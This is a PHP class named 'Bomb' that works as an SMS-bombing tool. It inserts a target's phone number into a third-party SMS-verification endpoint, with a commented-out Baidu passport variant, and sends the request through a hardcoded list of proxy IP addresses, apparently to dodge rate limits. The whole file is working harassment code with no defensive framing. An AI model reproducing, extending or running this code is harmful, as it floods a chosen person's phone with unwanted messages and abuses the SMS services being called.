<?php


namespace App\Library;


use GuzzleHttp\Client;

class Bomb
{
    public static function url($mobile)
    {
//        $url = "https://passport.baidu.com/v2/api/senddpass?gid=039945C-FAB2-48D6-89B5-B5BD0DD6F0CD&username={$mobile}&countrycode=&bdstoken=c9613b500342e744b93dc6cfbcee4868&tpl=mn&loginVersion=v4&flag_code=0&client=&dv=tk0.00560566869479317551562306640970%40ssX0rtAkqf924vEy6hn9aFG4BtJ~2CJyay8z9-nZ4gDpCzusCfumxbPLxfAkMlFkViAkqf924vEy6hn9aFG4BtJ~2CJya~IJBtorabDpCxukqxuJCxuktfumxGtGQsGV4BJyatGyhFunhFJiBg8yhcIzQ1Ak2Cu~2lFk2CupCCA4EhnVPptGyFJyhnG4wxu4aF8zy~GrHdIZGfunqyuk6wtX0VtB~2CAk5-B-C-uWVQA4EhnVPptGyFJyhnG4wxu4aFPJB18VQHIL9wB~8YAkuluKCYBnG-A4EhnVPptGyFJyhnG4wxu4aF8i9KIL1Y9i6H8sh183ClvnMfuWGxAk2yukVYAsCivntfvkufuWG~ukVf924vEy6hn9aFG4BtJ~2CJya~IJBGoLy183C_CbboEbBtHbsPhBXkupC-Ak8yIXMPrfCAWqCBnMCBnMzvkMQBk8Qu~2iBnGxBnM-u~qzBWtCvn8CkXposEY8sujA-aiPi8bMZ4eDsGbMzagA-xyIZE1DZ1bDLt_GXMumCCAk2~BWMfBW5yAk2~BWMfB~MlAk2~BWMfunuzBKCiuWS_&apiver=v3&tt=1562306666838&traceid=&callback=bd__cbs__ak2m6z";
        $url = "https://gc.moscales.com/frontend/sms/send?phoneNumber={$mobile}&type=1";
        return $url;
    }

    public static function bomb($mobile)
    {
        $ips    = "122.156.208.49:36410
171.220.168.152:894
114.223.188.66:894
115.208.17.56:766
117.44.11.109:766
60.185.130.212:3617
49.74.42.57:3617
114.223.190.46:23564
183.165.61.39:36410
223.241.23.41:3617
60.174.189.156:23564
223.240.246.12:766
119.176.16.214:894
114.223.178.186:23564
180.113.48.200:36410
182.87.239.40:894
180.113.8.245:894
175.170.47.64:5412
124.112.204.107:23564
115.237.148.139:766";
        $ips    = explode("\r\n", $ips);
        $ip     = array_pop($ips);
        $url    = self::url($mobile);
        $client = new Client();


        $response = $client->request('GET', $url, [
            'proxy' => [
                'http' => 'tcp://' . $ip
            ]
        ]);

        $res = $response->getBody()->getContents();
        return $res;
    }
}